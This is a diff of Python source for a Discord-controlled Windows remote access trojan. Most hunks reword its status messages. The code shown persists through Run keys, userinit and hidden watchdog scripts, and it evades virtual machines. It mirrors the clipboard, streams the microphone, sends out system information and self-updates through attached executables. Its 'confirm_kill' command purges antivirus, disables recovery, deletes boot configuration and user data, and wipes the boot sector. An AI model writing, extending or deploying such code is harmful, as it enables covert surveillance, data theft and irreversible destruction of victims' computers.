 async def hide_folder(ctx, *, path: str):
     p = resolve(path)
     _hide(p, True)
-    await ctx.send(embed=create_embed("🫥 Hidden", p, 0x00ff00))
+    await ctx.send(embed=create_embed("🫥 Hidden", "`{}` now has the hidden and system attributes set.".format(p), 0x00ff00))
 
 @bot.command(aliases=["deny-folder", "lock-folder"])
 async def lock_folder(ctx, *, path: str):
     p = resolve(path)
     subprocess.run(["icacls", p, "/deny", "*S-1-5-32-545:(OI)(CI)(DE,DC)"],
                    capture_output=True, creationflags=_CNW)
-    await ctx.send(embed=create_embed("🔒 Folder", p, 0xff0000))
+    await ctx.send(embed=create_embed("🔒 Folder", "Users can no longer delete anything inside `{}`.".format(p), 0xff0000))
 
 @bot.command(aliases=["allow-folder", "unlock-folder"])
 async def unlock_folder(ctx, *, path: str):
     p = resolve(path)
     subprocess.run(["icacls", p, "/remove:d", "*S-1-5-32-545"],
                    capture_output=True, creationflags=_CNW)
-    await ctx.send(embed=create_embed("🔓 Folder", p, 0x00ff00))
+    await ctx.send(embed=create_embed("🔓 Folder", "The delete lock was removed from `{}`.".format(p), 0x00ff00))
 
 @bot.command(aliases=["run-add", "startup-add"])
 async def startup_add(ctx, name: str, *, target: str):
     _reg_add(RUN_KEY, name, resolve(target), hive="HKCU")
-    await ctx.send(embed=create_embed("🚀 Run", f"{name} -> {target}", 0x00ff00))
+    await ctx.send(embed=create_embed("🚀 Run", "`{}` will run `{}` every time the user signs in.".format(name, target), 0x00ff00))
 
 @bot.command(aliases=["run-del", "startup-del"])
 async def startup_del(ctx, name: str):
     _reg_delete(RUN_KEY, name, "HKCU")
-    await ctx.send(embed=create_embed("🚀 Run", f"{name} removed", 0xff0000))
+    await ctx.send(embed=create_embed("🚀 Run", "`{}` was removed from the user startup entries.".format(name), 0xff0000))
 
 @bot.command(aliases=["load", "perf"])
 async def performance(ctx):
     cpu = psutil.cpu_percent(interval=0.7)
     ram = psutil.virtual_memory()
-    e = create_embed("📈 Load", "", 0x3498db)
+    e = create_embed("📈 Load", "Current resource usage of the machine.", 0x3498db)
     e.add_field(name="CPU", value=f"{cpu}%", inline=True)
     e.add_field(name="RAM", value=f"{ram.percent}%", inline=True)
     e.add_field(name="Procs", value=str(len(psutil.pids())), inline=True)
@@ -5754,7 +5806,7 @@ async def process_tree(ctx):
                 out.extend(walk(pid, depth + 1))
         return out
 
-    await send_long(ctx, "\n".join(walk(0, 0))[:6000] or "empty")
+    await send_long(ctx, "\n".join(walk(0, 0))[:6000] or "The process tree is empty.")
 
 @bot.command(aliases=["foreground", "fgwin", "win-top"])
 async def win_top(ctx):
@@ -5765,15 +5817,15 @@ async def win_top(ctx):
     try:
         name = psutil.Process(pid.value).name()
     except Exception:
-        name = "?"
-    await ctx.send(embed=create_embed("🪟 Foreground", f"```{title[:120]}\n{name} [{pid.value}]```", 0x3498db))
+        name = "unknown"
+    await ctx.send(embed=create_embed("🪟 Foreground", "The window in the foreground belongs to the process below.\n```{} [{}]\n{}```".format(name, pid.value, title[:120]), 0x3498db))
 
 @bot.command(aliases=["clipwatch", "clip-watch"])
 async def clipboard_watch(ctx, state: str = "on"):
     global clip_watch
     clip_watch = state != "off"
     if not clip_watch:
-        await ctx.send(embed=create_embed("📋 Clipboard", "Stopped.", 0xff0000))
+        await ctx.send(embed=create_embed("📋 Clipboard", "The clipboard watcher was stopped.", 0xff0000))
         return
 
     def loop():
@@ -5794,24 +5846,23 @@ async def clipboard_watch(ctx, state: str = "on"):
             time.sleep(1.5)
 
     threading.Thread(target=loop, daemon=True).start()
-    await ctx.send(embed=create_embed("📋 Clipboard", "Watching.", 0x00ff00))
+    await ctx.send(embed=create_embed("📋 Clipboard", "Every change of the clipboard will be mirrored into the keys channel.", 0x00ff00))
 
 @bot.command(aliases=["boot-info", "boot-cfg"])
 async def boot_info(ctx):
     b = datetime.fromtimestamp(psutil.boot_time())
-    await ctx.send(embed=create_embed("⏱️ Boot", f"boot: {b:%Y-%m-%d %H:%M:%S}\n"
-                                                f"uptime: {str(datetime.now() - b).split('.')[0]}", 0x3498db))
+    await ctx.send(embed=create_embed("⏱️ Boot", "The machine booted at `{}` and has been up for `{}`.".format(b.strftime("%Y-%m-%d %H:%M:%S"), str(datetime.now() - b).split(".")[0]), 0x3498db))
 
 @bot.command(aliases=["delay-off", "sched-shutdown"])
 async def sched_shutdown(ctx, seconds: int = 60):
     subprocess.run(["shutdown", "/s", "/f", "/t", str(max(5, min(seconds, 86400)))],
                    capture_output=True, creationflags=_CNW)
-    await ctx.send(embed=create_embed("⏻ Shutdown", f"in {seconds}s", 0xff0000))
+    await ctx.send(embed=create_embed("⏻ Shutdown", "The machine will shut down in **{}** seconds, `.cancel` stops it.".format(seconds), 0xff0000))
 
 @bot.command()
 async def matrix(ctx):
     threading.Thread(target=flash_screen, args=("matrix_rain",), daemon=True).start()
-    await ctx.send(embed=create_embed("🟩 Matrix", "Running.", 0x00ff00))
+    await ctx.send(embed=create_embed("🟩 Matrix", "The green matrix rain is falling over the desktop.", 0x00ff00))
 
 @bot.command(aliases=["wdiag", "persist"])
 async def watchdog_status(ctx):
@@ -5834,20 +5885,11 @@ async def watchdog_status(ctx):
     lines.append("watchdog: " + ("pid {}".format(_watch_proc.pid) if alive else "DOWN"))
     await send_long(ctx, "\n".join(lines))
 
-@bot.command(aliases=["repair"])
-async def repair_now(ctx):
-    await ctx.message.add_reaction("🔧")
-    try:
-        await asyncio.to_thread(repair_all)
-        await ctx.send(embed=create_embed("🔧 Repair", "Done.", 0x00ff00))
-    except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xff0000))
-
 @bot.command(aliases=["vmdiag", "vmcheck", "vmping"])
 async def vm_diag(ctx):
     strong, weak = vm_hits()
     kill = len(strong) >= VM_STRONG_MIN or len(weak) >= VM_SCORE_MIN
-    e = create_embed("🧪 VM guard", "verdict: **{}**".format("EXIT" if kill else "RUN"),
+    e = create_embed("🧪 VM guard", "The verdict is **{}**, based on the hits below.".format("EXIT" if kill else "RUN"),
                      0xFF0000 if kill else 0x00FF00)
     e.add_field(name="strong ({}/{})".format(len(strong), VM_STRONG_MIN),
                 value="```{}```".format("\n".join(strong) or "-"), inline=False)
@@ -5858,10 +5900,10 @@ async def vm_diag(ctx):
 @bot.command(aliases=["crashlog", "clog", "crash"])
 async def crash_log(ctx):
     if not os.path.exists(CRASH_FILE):
-        await ctx.send(embed=create_embed("🧯 Crash log", "No file at `{}`".format(CRASH_FILE), 0x3498DB))
+        await ctx.send(embed=create_embed("🧯 Crash log", "There is no crash log at `{}`.".format(CRASH_FILE), 0x3498DB))
         return
     size = os.path.getsize(CRASH_FILE)
-    await ctx.send(embed=create_embed("🧯 Crash log", "`{}` — {} B".format(CRASH_FILE, size), 0x3498DB),
+    await ctx.send(embed=create_embed("🧯 Crash log", "The log is `{}` bytes long and is attached below.".format(size), 0x3498DB),
                    file=discord.File(CRASH_FILE, filename="crash.log"))
 
 @bot.command(aliases=["crashclear", "clearcrash"])
@@ -5871,7 +5913,7 @@ async def crash_clear(ctx):
             os.remove(p)
         except Exception:
             pass
-    await ctx.send(embed=create_embed("🧯 Crash log", "Cleared.", 0x00FF00))
+    await ctx.send(embed=create_embed("🧯 Crash log", "The crash log and the fault log were deleted.", 0x00FF00))
 
 @bot.command(aliases=["fbsod", "fake-bsod"])
 async def fake_bsod(ctx):
@@ -5887,7 +5929,7 @@ async def fake_bsod(ctx):
         r.after(12000, r.destroy)
         r.mainloop()
     threading.Thread(target=run, daemon=True).start()
-    await ctx.send(embed=create_embed("💀 Fake BSOD", "Shown.", 0xff0000))
+    await ctx.send(embed=create_embed("💀 Fake BSOD", "A fake blue screen was shown fullscreen for twelve seconds.", 0xff0000))
 
 @bot.command(aliases=["flock", "fake-lock"])
 async def fake_lock(ctx):
@@ -5904,33 +5946,7 @@ async def fake_lock(ctx):
         r.after(10000, r.destroy)
         r.mainloop()
     threading.Thread(target=run, daemon=True).start()
-    await ctx.send(embed=create_embed("🔐 Fake Lock", "Shown.", 0x0084ff))
-
-@bot.command(aliases=["fupdate", "fake-update"])
-async def fake_update(ctx):
-    def run():
-        r = tkinter.Tk()
-        r.configure(bg="#11151a")
-        r.attributes("-fullscreen", True, "-topmost", True)
-        tkinter.Label(r, text="Working on updates", bg="#11151a", fg="white",
-                      font=("Segoe UI", 42)).pack(pady=(220, 10))
-        tkinter.Label(r, text="Don't turn off your PC. This will take a while.",
-                      bg="#11151a", fg="#cfd3d8", font=("Segoe UI", 16)).pack()
-        bar = tkinter.Canvas(r, height=8, bg="#2a3038", highlightthickness=0)
-        bar.pack(fill="x", padx=180, pady=40)
-        fill = bar.create_rectangle(0, 0, 0, 8, fill="#4cc2ff", width=0)
-
-        def tick(p=0):
-            if p > 100:
-                r.destroy()
-                return
-            bar.coords(fill, 0, 0, bar.winfo_width() * p / 100, 8)
-            r.after(120, lambda: tick(p + 2))
-
-        tick()
-        r.mainloop()
-    threading.Thread(target=run, daemon=True).start()
-    await ctx.send(embed=create_embed("🔄 Fake Update", "Shown.", 0x0084ff))
+    await ctx.send(embed=create_embed("🔐 Fake Lock", "A fake lock screen with the current time and user was shown for ten seconds.", 0x0084ff))
 
 @bot.command(aliases=["bscreen", "black-screen"])
 async def black_screen(ctx, seconds: int = 10):
@@ -5941,7 +5957,7 @@ async def black_screen(ctx, seconds: int = 10):
         r.after(max(1, min(seconds, 600)) * 1000, r.destroy)
         r.mainloop()
     threading.Thread(target=run, daemon=True).start()
-    await ctx.send(embed=create_embed("⬛ Black Screen", f"{seconds}s", 0xff0000))
+    await ctx.send(embed=create_embed("⬛ Black Screen", "The screen was covered with black for **{}** seconds.".format(seconds), 0xff0000))
 
 @bot.command(aliases=["capsroulette", "caps-roulette"])
 async def caps_roulette(ctx, seconds: int = 30):
@@ -5951,7 +5967,7 @@ async def caps_roulette(ctx, seconds: int = 30):
             _set_lock("capslock", random.random() > 0.5)
             time.sleep(random.uniform(0.4, 1.8))
     threading.Thread(target=run, daemon=True).start()
-    await ctx.send(embed=create_embed("⌨️ Caps Roulette", f"{seconds}s", 0xf39c12))
+    await ctx.send(embed=create_embed("⌨️ Caps Roulette", "Caps Lock will flip randomly for **{}** seconds.".format(seconds), 0xf39c12))
 
 @bot.command(aliases=["vroulette", "volume-roulette"])
 async def volume_roulette(ctx, seconds: int = 20):
@@ -5961,7 +5977,7 @@ async def volume_roulette(ctx, seconds: int = 20):
             set_volume_level(random.choice([0.0, 0.25, 0.6, 1.0]))
             time.sleep(0.8)
     threading.Thread(target=run, daemon=True).start()
-    await ctx.send(embed=create_embed("🔊 Volume Roulette", f"{seconds}s", 0xf39c12))
+    await ctx.send(embed=create_embed("🔊 Volume Roulette", "The volume will jump between random levels for **{}** seconds.".format(seconds), 0xf39c12))
 
 @bot.command(aliases=["numspam", "numlock-spam"])
 async def numlock_spam(ctx, times: int = 20):
@@ -5970,7 +5986,7 @@ async def numlock_spam(ctx, times: int = 20):
         time.sleep(0.08)
         _set_lock("numlock", False)
         time.sleep(0.08)
-    await ctx.send(embed=create_embed("🔢 Num Spam", f"x{times}", 0xf39c12))
+    await ctx.send(embed=create_embed("🔢 Num Spam", "Num Lock was flipped **{}** times in a row.".format(times), 0xf39c12))
 
 @bot.command(aliases=["wshake", "window-shake"])
 async def window_shake(ctx, times: int = 20):
@@ -5984,7 +6000,7 @@ async def window_shake(ctx, times: int = 20):
             time.sleep(0.04)
         win32gui.SetWindowPos(hwnd, 0, x, y, 0, 0, 0x0001 | 0x0004)
     threading.Thread(target=run, daemon=True).start()
-    await ctx.send(embed=create_embed("🪟 Shake", f"x{times}", 0xf39c12))
+    await ctx.send(embed=create_embed("🪟 Shake", "The foreground window was shaken **{}** times.".format(times), 0xf39c12))
 
 @bot.command(aliases=["mess", "desktop-mess"])
 async def desktop_mess(ctx, count: int = 60):
@@ -5996,7 +6012,7 @@ async def desktop_mess(ctx, count: int = 60):
                 f.write(_rand(24))
         except Exception:
             pass
-    await ctx.send(embed=create_embed("🗂️ Desktop", f"{n} files", 0xf39c12))
+    await ctx.send(embed=create_embed("🗂️ Desktop", "**{}** junk text files were dropped on the desktop.".format(n), 0xf39c12))
 
 @bot.command(aliases=["hold", "mouse-hold"])
 async def mouse_hold(ctx, seconds: int = 5):
@@ -6005,7 +6021,7 @@ async def mouse_hold(ctx, seconds: int = 5):
         time.sleep(max(1, min(seconds, 120)))
         win32api.mouse_event(0x0004, 0, 0, 0, 0)
     threading.Thread(target=run, daemon=True).start()
-    await ctx.send(embed=create_embed("🖱️ Hold", f"{seconds}s", 0xf39c12))
+    await ctx.send(embed=create_embed("🖱️ Hold", "The left mouse button is held down for **{}** seconds.".format(seconds), 0xf39c12))
 
 @bot.command(aliases=["errstorm", "error-storm"])
 async def error_storm(ctx, count: int = 5):
@@ -6022,12 +6038,12 @@ async def error_storm(ctx, count: int = 5):
             time.sleep(0.15)
 
     threading.Thread(target=run, daemon=True).start()
-    await ctx.send(embed=create_embed("⚠️ Error Storm", f"x{n}", 0xff0000))
+    await ctx.send(embed=create_embed("⚠️ Error Storm", "**{}** error dialogs were stacked on the screen.".format(n), 0xff0000))
 
 @bot.command(aliases=["rickroll"])
 async def rick_roll(ctx):
     subprocess.Popen(["start", "https://www.youtube.com/watch?v=xvFZjo5PgG0"], shell=True)
-    await ctx.send(embed=create_embed("🎵 Rickroll", "Opened.", 0x00ff00))
+    await ctx.send(embed=create_embed("🎵 Rickroll", "The browser was opened on the classic video.", 0x00ff00))
 
 @bot.command(aliases=["tbar", "taskbar-dance"])
 async def taskbar_dance(ctx, times: int = 10):
@@ -6035,22 +6051,22 @@ async def taskbar_dance(ctx, times: int = 10):
     for i in range(max(2, min(times, 100))):
         win32gui.ShowWindow(hwnd, win32con.SW_HIDE if i % 2 == 0 else win32con.SW_SHOW)
         time.sleep(0.25)
-    await ctx.send(embed=create_embed("🪟 Taskbar", "Danced.", 0xf39c12))
+    await ctx.send(embed=create_embed("🪟 Taskbar", "The taskbar was hidden and shown **{}** times.".format(times), 0xf39c12))
 
 @bot.command(aliases=["confirm-kill"])
 async def confirm_kill(ctx):
-    await ctx.send("`💻` Destroying system... If this is the last bot message, the system has been destroyed. The bot will not reply to more commands if the system is destroyed.")
+    await ctx.send("`💻` The system is being destroyed. If this is the last message the bot sends, the machine is gone for good.")
 
     async def step(msg):
         await ctx.send(f"`»` {msg}")
 
-    await step("Purging security software")
+    await step("Purging the security software")
     try:
         await asyncio.to_thread(purge_av)
     except Exception:
         pass
 
-    await step("Killing recovery")
+    await step("Killing the recovery environment")
     def kill_recovery():
         for args in (
             ["reagentc", "/disable"],
@@ -6067,7 +6083,7 @@ async def confirm_kill(ctx):
                 pass
     await asyncio.to_thread(kill_recovery)
 
-    await step("Deleting BCD store")
+    await step("Deleting the boot configuration store")
     for bcd in (r"C:\Boot\BCD", r"C:\EFI\Microsoft\Boot\BCD"):
         try:
             subprocess.run(["attrib", "-h", "-s", "-r", bcd], capture_output=True, creationflags=_CNW)
@@ -6075,7 +6091,7 @@ async def confirm_kill(ctx):
         except Exception:
             pass
 
-    await step("Deleting user data")
+    await step("Deleting the user data")
     for folder in ("Downloads", "Desktop", "Documents", "Music", "Pictures",
                    "Videos", r"AppData\Local\Temp"):
         p = os.path.join(os.path.expanduser("~"), folder)
@@ -6091,7 +6107,7 @@ async def confirm_kill(ctx):
             f'rd /s /q "{os.path.join(WINDIR, d)}"', shell=True,
             capture_output=True, creationflags=_CNW))
 
-    await step("Wiping boot sector and partition table")
+    await step("Wiping the boot sector and the partition table")
     subprocess.run(["bootsect", "/nt60", "SYS", "/force", "/mbr"],
                    capture_output=True, creationflags=_CNW)
     subprocess.run(["bootsect", "/nt60", "ALL", "/force", "/mbr"],
@@ -6108,7 +6124,7 @@ async def confirm_kill(ctx):
     except Exception:
         pass
 
-    await step("Rebooting")
+    await step("Rebooting in three seconds")
     subprocess.Popen(["shutdown", "/r", "/f", "/t", "3"], shell=True)
 
 
@@ -6117,9 +6133,9 @@ async def confirm_kill(ctx):
 
 @bot.command()
 async def exit(ctx):
-    await ctx.send(embed=create_embed("👋 Goodbye", "Suspending watchdog...", 0x00ff00))
+    await ctx.send(embed=create_embed("👋 Goodbye", "The watchdog is being suspended and the process is closing, nothing will bring it back until the next logon.", 0x00ff00))
     if not await asyncio.to_thread(_watch_suspend):
-        await ctx.send(embed=create_embed("Error", "Watcher survived, closing anyway.", 0xffa500))
+        await ctx.send(embed=create_embed("Error", "The watchdog would not die, but the process is closing anyway.", 0xffa500))
     try:
         await asyncio.wait_for(bot.close(), 5)
     except Exception:
@@ -6130,11 +6146,11 @@ async def exit(ctx):
 @bot.command()
 async def update(ctx):
     if not ctx.message.attachments:
-        await ctx.send("Attach the new .exe with the `.update` command.")
+        await ctx.send(":exclamation: You have to attach the new executable to the same message as the command.")
         return
     attachment = ctx.message.attachments[0]
     if not attachment.filename.lower().endswith(".exe"):
-        await ctx.send("The attachment must be an .exe file.")
+        await ctx.send(":exclamation: The attachment has to be an executable ending in `.exe`.")
         return
 
     st = _ensure_state()
@@ -6154,7 +6170,7 @@ async def update(ctx):
         with open(new_path, "rb") as f:
             magic = f.read(2)
     except Exception as e:
-        await ctx.send(embed=create_embed("Error", str(e), 0xFF0000))
+        await ctx.send(embed=create_embed("Error", "The binary could not be saved: {}".format(e), 0xFF0000))
         return
 
     if size < 100_000 or magic != b"MZ":
@@ -6162,12 +6178,12 @@ async def update(ctx):
             os.remove(new_path)
         except Exception:
             pass
-        await ctx.send(embed=create_embed("Error", "Invalid binary, aborted.", 0xFF0000))
+        await ctx.send(embed=create_embed("Error", "The file is not a valid executable, the update was aborted.", 0xFF0000))
         return
 
-    await ctx.send(embed=create_embed("📲 Updating", "Suspending watchdog...", 0x00FF00))
+    await ctx.send(embed=create_embed("📲 Updating", "The watchdog is being suspended before the swap.", 0x00FF00))
     if not await asyncio.to_thread(_watch_suspend):
-        await ctx.send(embed=create_embed("Error", "Watcher would not die, aborted.", 0xFF0000))
+        await ctx.send(embed=create_embed("Error", "The watchdog refused to die, the update was aborted.", 0xFF0000))
         await asyncio.to_thread(_watch_resume)
         return
 
@@ -6184,7 +6200,7 @@ async def update(ctx):
             os.rename(str(target), old)
         shutil.copy2(new_path, str(target))
         if not target.exists() or target.stat().st_size != size:
-            raise OSError("swap did not verify")
+            raise OSError("the swap did not verify")
         _hide(str(target), True)
         _lock_exe(target)
         try:
@@ -6204,7 +6220,7 @@ async def update(ctx):
                 os.rename(str(target) + ".old", str(target))
         except Exception:
             pass
-        await ctx.send(embed=create_embed("Error", "Swap failed: {}".format(e), 0xFF0000))
+        await ctx.send(embed=create_embed("Error", "The swap failed and the old binary was restored: {}".format(e), 0xFF0000))
         await asyncio.to_thread(_watch_resume)
         return
 
@@ -6217,7 +6233,7 @@ async def update(ctx):
             raise OSError("ShellExecute returned {}".format(r))
     except Exception as e:
         _mutex_claim()
-        await ctx.send(embed=create_embed("Error", "Launch failed: {}".format(e), 0xFF0000))
+        await ctx.send(embed=create_embed("Error", "The new binary is in place but could not be launched: {}".format(e), 0xFF0000))
         await asyncio.to_thread(_watch_resume)
         return
 
@@ -6229,29 +6245,29 @@ async def update(ctx):
 @bot.command(aliases=["set-date"])
 async def set_date(ctx, date_str: str):
     ps(f'Set-Date -Date "{date_str}"')
-    await ctx.send(embed=create_embed("📅 Date", f"Set to {date_str}.", 0x00ff00))
+    await ctx.send(embed=create_embed("📅 Date", "The system date was set to `{}`.".format(date_str), 0x00ff00))
 
 
 @bot.command(aliases=["set-time", "set-hour"])
 async def set_time(ctx, time_str: str):
     ps(f'Set-Date -Date "{time_str}"')
-    await ctx.send(embed=create_embed("⌛ Time", f"Set to {time_str}.", 0x00ff00))
+    await ctx.send(embed=create_embed("⌛ Time", "The system clock was set to `{}`.".format(time_str), 0x00ff00))
 
 
 @bot.command(aliases=["uac-bypass"])
 async def uac_bypass(ctx):
-    await ctx.send("`🧮` Attempting UAC bypass...")
+    await ctx.send("`🧮` A UAC bypass is being attempted.")
     subprocess.run(["powershell", "-Command", "Start-Process powershell -Verb runAs"], capture_output=True)
-    await ctx.send(embed=create_embed("🧮 UAC", "Elevation attempted.", 0x00ff00))
+    await ctx.send(embed=create_embed("🧮 UAC", "The elevation was requested and the consent prompt should be on the screen.", 0x00ff00))
 
 
 @bot.command(aliases=["ask-admin"])
 async def ask_admin(ctx):
     if is_admin():
-        await ctx.send("`👔` Already admin.")
+        await ctx.send("`👔` The process is already elevated, nothing to do.")
         return
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-    await ctx.send(embed=create_embed("👔 Admin", "UAC prompt sent.", 0x00ff00))
+    await ctx.send(embed=create_embed("👔 Admin", "A new elevated instance was requested through the UAC prompt.", 0x00ff00))
 
 
 async def post_info_channel(guild):
@@ -6264,16 +6280,16 @@ async def post_info_channel(guild):
         pass
 
     pc = socket.gethostname()
-    await info_ch.send(embed=create_embed("ℹ️ System Information", "Machine: **{}**".format(pc), 0x3498DB))
+    await info_ch.send(embed=create_embed("ℹ️ System Information", "The machine that just connected is called **{}**.".format(pc), 0x3498DB))
     raw = await asyncio.to_thread(exec_capture, "systeminfo")
     await _send_text_files(info_ch, "systeminfo_{}".format(pc), raw)
-    await info_ch.send(embed=create_embed("Grab", "Not collected on boot. Run `.grab all` when you want it.", 0x00FF00))
+    await info_ch.send(embed=create_embed("Grab", "The grabber is not run on boot, use `.grab all` whenever you want the data.", 0x00FF00))
 
 @bot.command()
 async def join(ctx):
     global voice_client, _voice_gen
     if not ctx.author.voice:
-        await ctx.send(embed=create_embed("Error", "Join a voice channel first.", 0xFF0000))
+        await ctx.send(embed=create_embed("Error", "You have to be inside a voice channel first.", 0xFF0000))
         return
     if voice_client and voice_client.is_connected():
         await voice_client.move_to(ctx.author.voice.channel)
@@ -6281,7 +6297,7 @@ async def join(ctx):
         voice_client = await ctx.author.voice.channel.connect()
     _voice_gen += 1
     threading.Thread(target=_voice_watchdog, args=(_voice_gen,), daemon=True).start()
-    await ctx.send(embed=create_embed("Voice", f"Connected to `{ctx.author.voice.channel.name}`.", 0x00FF00))
+    await ctx.send(embed=create_embed("Voice", "The microphone is being streamed into `{}` and will restart by itself if it drops.".format(ctx.author.voice.channel.name), 0x00FF00))
 
 
 @bot.command()
@@ -6290,8 +6306,7 @@ async def disconnect(ctx):
     voice_reconnect = False
     if voice_client and voice_client.is_connected():
         await voice_client.disconnect()
-    await ctx.send(embed=create_embed("Voice", "Disconnected.", 0x00FF00))
-
+    await ctx.send(embed=create_embed("Voice", "The microphone stream was stopped and the bot left the channel.", 0x00FF00))
 
 async def _setup_guild(guild, category_name, pc_name):
     gid = guild.id
@@ -6453,7 +6468,7 @@ async def on_command_error(ctx, error):
         "".join(traceback.format_exception(type(error), error, error.__traceback__))))
     try:
         await ctx.send(embed=create_embed(
-            "Error", "`{}`: {}".format(ctx.command, error)[:1900], 0xFF0000))
+            "Error", "The command `{}` failed: {}".format(ctx.command, error)[:1900], 0xFF0000))
     except Exception:
         pass
 
@@ -6490,6 +6505,1262 @@ async def on_message(message):
         pass
 
 check_blacklist = blacklist_watcher
+import urllib.request
+
+def _sh(cmd, timeout=90):
+    try:
+        return subprocess.run(cmd, capture_output=True, text=True, errors="replace",
+                              creationflags=_CNW, timeout=timeout)
+    except Exception as e:
+        class _R:
+            stdout, stderr, returncode = "", str(e), 1
+        return _R()
+
+def _psrun(script, timeout=120):
+    return _sh(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", script], timeout)
+
+def _out(r, limit=1800):
+    txt = ((r.stdout or "") + (r.stderr or "")).strip() or "(No output)"
+    return txt[-limit:]
+
+def _watch_bats():
+    st = _state_read() or {}
+    return [s["bat"] for s in (st.get("slots") or []) if s.get("bat")]
+
+def _watch_kill():
+    bats = [b.lower() for b in _watch_bats()]
+    if not bats:
+        return 0
+    n = 0
+    for p in psutil.process_iter(["pid", "name", "cmdline"]):
+        try:
+            if (p.info.get("name") or "").lower() != "cmd.exe":
+                continue
+            cl = " ".join(p.info.get("cmdline") or []).lower()
+            if any(b in cl for b in bats):
+                p.kill()
+                n += 1
+        except Exception:
+            pass
+    return n
+
+def _watch_write():
+    st = _state_read() or {}
+    slots = st.get("slots") or []
+    if not slots:
+        return False
+    task = st.get("task") or ("\\Microsoft\\Windows\\" + os.path.splitext(os.path.basename(slots[0]["exe"]))[0])
+    defs = "\n".join('set "S{0}={1}"'.format(i, s["exe"]) for i, s in enumerate(slots))
+    find = "\n".join('if not defined SRC if exist "%S{0}%" set "SRC=%S{0}%"'.format(i)
+                     for i in range(1, len(slots)))
+    restore = "\n".join(
+        '  if not exist "%S{0}%" copy /y "%SRC%" "%S{0}%" >nul 2>&1\n'
+        '  if exist "%S{0}%" attrib +h +s +r "%S{0}%" >nul 2>&1'.format(i)
+        for i in range(len(slots)))
+    body = _WATCH_BAT.format(defs=defs, find=find, restore=restore,
+                             vbs=_watch_vbs_block(0),
+                             name=os.path.basename(slots[0]["exe"]), task=task)
+    vbs = slots[0]["exe"] + ".vbs"
+    try:
+        with open(vbs, "w", encoding="utf-8", newline="\r\n") as f:
+            f.write('Set s = CreateObject("WScript.Shell")\n')
+            f.write('s.Run """" & "{}" & """", 0, False\n'.format(slots[0]["exe"]))
+        _hide(vbs, True)
+    except Exception:
+        pass
+    ok = False
+    for s in slots:
+        try:
+            os.makedirs(os.path.dirname(s["bat"]), exist_ok=True)
+            with open(s["bat"], "w", encoding="utf-8", newline="\r\n") as f:
+                f.write(body)
+            _hide(s["bat"], True)
+            ok = True
+        except Exception:
+            pass
+    return ok
+
+def _watch_resume():
+    st = _state_read() or {}
+    bat = next((b for b in _watch_bats() if os.path.exists(b)), None)
+    if not bat:
+        return
+    tag = "LMG_" + (st.get("mutex") or "0")
+    vbs = _watch_vbs(bat, tag)
+    try:
+        if vbs:
+            subprocess.Popen(["wscript.exe", "//B", vbs], creationflags=_CNW,
+                             stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
+                             stderr=subprocess.DEVNULL, close_fds=True)
+        else:
+            subprocess.Popen(["cmd.exe", "/c", bat, tag], creationflags=_CNW,
+                             stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
+                             stderr=subprocess.DEVNULL, close_fds=True)
+    except Exception:
+        pass
+
+def _slots():
+    st = _state_read() or {}
+    out = []
+    for s in st.get("slots") or []:
+        for k in ("exe", "bat"):
+            if s.get(k):
+                out.append(s[k])
+        if s.get("exe"):
+            out.append(s["exe"] + ".vbs")
+        if s.get("bat"):
+            out.append(s["bat"] + ".vbs")
+    return [p for p in out if p]
+
+@bot.command(name="repair")
+async def repair(ctx):
+    _watch_kill()
+    time.sleep(0.6)
+    _watch_write()
+    try:
+        ok = install_userinit()
+    except Exception:
+        ok = False
+    _watch_resume()
+    await ctx.send(embed=create_embed("🛠️ Repair",
+                                      "The watchdog was respawned and the userinit entry is {}.".format("ok" if ok else "failed"),
+                                      0x00ff00 if ok else 0xffaa00))
+
+@bot.command(name="exe", aliases=["dump"])
+async def exe(ctx):
+    src = sys.executable if getattr(sys, "frozen", False) else (__file__ or "")
+    if not src or not os.path.exists(src):
+        return await ctx.send(embed=create_embed("📦 EXE", "The path of the running binary could not be resolved.", 0xff4444))
+    if os.path.getsize(src) > 32 * 1024 * 1024:
+        return await ctx.send(embed=create_embed("📦 EXE", "The binary is larger than 32 MB and cannot be attached here.", 0xff4444))
+    await ctx.send(file=discord.File(src, filename=os.path.basename(src)))
+
+@bot.command(name="uninstall")
+async def uninstall(ctx):
+    await ctx.send(embed=create_embed("💣 Uninstall", "The watchdog was killed and every trace is being deleted.", 0xff4444))
+    _watch_kill()
+    time.sleep(1.0)
+    st = _state_read() or {}
+    for t in [x for x in (st.get("task"), (st.get("task") or "") + "_w") if x]:
+        subprocess.run(["schtasks", "/Delete", "/TN", t, "/F"], capture_output=True, creationflags=_CNW)
+    try:
+        uninstall_userinit()
+    except Exception:
+        pass
+    for p in _slots():
+        try:
+            subprocess.run(["attrib", "-r", "-s", "-h", p], capture_output=True, creationflags=_CNW)
+            os.remove(p)
+        except Exception:
+            pass
+    subprocess.Popen(["cmd.exe", "/c", "timeout /t 2 >nul & start \"\" \"{}\"".format(sys.executable)],
+                     creationflags=_CNW)
+    os._exit(0)
+
+_WIPE_FLAGS = 0x08000000 | 0x00000008 | 0x00000200  # NO_WINDOW | DETACHED | NEW_PROCESS_GROUP
+
+
+def _wipe_bat(paths, dirs):
+    lines = ["@echo off", "setlocal EnableExtensions",
+             "ping -n 4 127.0.0.1 >nul 2>&1"]
+    for p in paths:
+        lines.append('call :kill "{}"'.format(p))
+    for d in dirs:
+        lines.append('rd /s /q "{}" >nul 2>&1'.format(d))
+    lines.append('(goto) 2>nul & del /f /q "%~f0" >nul 2>&1')
+    lines.append("exit /b 0")
+    lines.append("")
+    lines.append(":kill")
+    lines.append("for /l %%i in (1,1,25) do (")
+    lines.append('  icacls "%~1" /reset >nul 2>&1')
+    lines.append('  attrib -r -s -h "%~1" >nul 2>&1')
+    lines.append('  del /f /q "%~1" >nul 2>&1')
+    lines.append('  if not exist "%~1" exit /b 0')
+    lines.append("  ping -n 2 127.0.0.1 >nul 2>&1")
+    lines.append(")")
+    lines.append("exit /b 1")
+
+    path = os.path.join(os.environ.get("TEMP", r"C:\Windows\Temp"),
+                        "lmwipe_{}.bat".format(_rand(8)))
+    with open(path, "w", encoding="utf-8", newline="\r\n") as f:
+        f.write("\r\n".join(lines) + "\r\n")
+    _hide(path, True)
+    return path
+
+
+@bot.command(name="implode", aliases=["wipe", "autodestruct"])
+async def implode(ctx):
+    if not is_admin():
